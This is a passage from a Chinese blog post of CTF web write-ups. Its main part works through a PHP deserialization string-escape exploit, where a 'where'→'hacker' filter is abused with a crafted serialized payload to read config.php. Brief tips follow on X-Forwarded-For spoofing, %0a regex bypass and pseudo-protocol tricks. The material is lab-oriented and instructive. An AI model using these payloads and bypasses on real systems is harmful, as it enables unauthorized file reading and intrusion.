<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshtzstvoj31b80byq4v.jpg" alt=""></p>
<p>因为要控制phpto这个字段，所以我们可以从nickname入手，通过传递数组即可绕过长度和正则判断。</p>
<p>我们先本地写一写poc来理一理思路</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span> = <span class="keyword">array</span>(<span class="string">&quot;phone&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;phone&#x27;</span>], <span class="string">&quot;email&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>], <span class="string">&quot;nickname&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;nickname&#x27;</span>], <span class="string">&quot;photo&quot;</span> =&gt; <span class="string">&quot;upload/&quot;</span> . md5(<span class="string">&quot;lemon.php&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = serialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$t</span>;</span><br><span class="line"><span class="comment">// a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:16:&quot;lemon@hacker.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:7:&quot;payload&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/31bddb5e1ea7e741dce2c091a0e8068d&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>我们看我们传入之后做的filter，在class.php中，又做了一层filter，本意是防止sql注入的一个utils方法，但是不应该用在序列化和反序列中，注意到，where是五个字符，会将其替换为hacker，变成六个字符，导致了反序列化字符串逃逸漏洞。</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsi98ia09j30w60fm761.jpg" alt=""></p>
<p>那么我们的payload应该如下构造，是以下面这种形式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:16:&quot;lemon@hacker.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:7:&quot;...&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>那么我们就要考虑长度问题，可以用where到hacker使之增长一个字符，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="string">&#x27;&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>)</span><br><span class="line"><span class="number">34</span></span><br></pre></td></tr></table></figure>
<p>这一段的长度为34，所以我们应该变长34个字符，用34个where即可变长34个字符，这样后34个字符可以逃逸出去，我们抓包来打这个。</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsiizdrn5j31h60u07hr.jpg" alt=""></p>
<p>访问profile.php，拿到base64encode数据</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsilxej6wj31h60u07bq.jpg" alt=""></p>
<p>成功读取flag</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsimjz0boj327y08y76p.jpg" alt=""></p>
<h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsru5ix92j31140u00vw.jpg" alt=""></p>
<p>看了wp，发现是提示“我自己”，于是该X-Forwarded-For，什么脑洞题😅</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsrtp8oirj31h60u0q8k.jpg" alt=""></p>
<h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><ul>
<li>传参中的空格和小数点会自动替换为下划线</li>
<li>%0a可以绕过开头结尾的正则</li>
<li>Client-ip和X-Forwarded-For用来记录ip</li>
<li>file_get_contents利用伪协议可以绕过</li>
</ul>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Alex</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/10/26/备赛选择题大赛决赛/">http://example.com/2021/10/26/备赛选择题大赛决赛/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com">Alex's blog~</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2021/11/05/SP2%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fa fa-chevron-left">  </i><span>cve-2018-20129-dedecms-SP2前台文件上传漏洞分析复现</span></a></div><div class="next-post pull-right"><a href="/2021/10/11/UJNCTF%E6%A0%A1%E8%B5%9Bwp/"><span>UJNCTF校赛wp</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2021.03.05 - 2024 By Alex</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>